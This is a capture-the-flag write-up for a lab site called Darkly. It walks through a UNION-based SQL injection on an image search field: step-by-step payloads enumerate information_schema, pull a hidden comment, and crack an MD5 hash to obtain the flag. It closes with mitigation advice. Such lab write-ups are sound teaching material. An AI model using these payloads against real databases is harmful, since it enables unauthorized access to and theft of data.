# SQL Injection - Images

## What is it ?

Listed among the OWASP top 10 Web Application Security Risks, an injection "occur when untrusted data is sent to an interpreter as part of a command or query. The attackerâ€™s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization." (OWASP)

More precisely an SQL injection will trick an SQL interpreter.

## Some use cases

* accessing sensitive data and stealing / corrupting / deleting 
* injecting data
* taking host over
* denial of service

## Exploit on Darkly

### Context
On the `Search image` part of the site we are asked to enter an `IMAGE NUMBER`. The query outputs 3 fields:
	* the `ID` (image number) we made the query on
	* `Title`
	* `Url`

### Solution
As there is a potential SQL injection weakness, we do the following:

1. Trying to know how many columns there are in the original query (see below for the explanation about those commands): 
	* `1 UNION SELECT 1` outputs nothing
	* `1 UNION SELECT 1, 2` works fine so we guess there are two columns

2. Get the tables schema and names:
	* `1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables`

3. Get the tables columns:
	* `1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns`

4. Combining all the information we got from those queries, we discover that there is a `list_images` table with some potentially interesting columns:
	* `1 AND 1=2 UNION SELECT comment, 1 FROM Member_images.list_images` outputs, for one of the images, `If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46`

5. Following the instructions above:
	* we decrypt the hash on [dcode](https://www.dcode.fr/fonction-hash#f0), what outputs `albatroz`
	* on the same website, we hash (shasum 256) `albatroz`, what outputs `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d61885`


### More details about the SQL commands

* `UNION` is a command that allows to concatenate the results of two different queries. The two queries must have the same number of columns
* `AND 1=2` is a condition that makes the first query always `false`: it won't output anything and we will gain readability

## Some ways to avoid it

* never trust the user inputs : validate / filter / sanitize the data sent to the site:
	* in our example, check that the user input is only an integer
	* for other queries (for example involving strings), escape all the special chars
	* set a whitelist of accepted characters
* in case the injection succeeds:
	* use control commands like `LIMIT` in SQL
	* use principle of least privilege
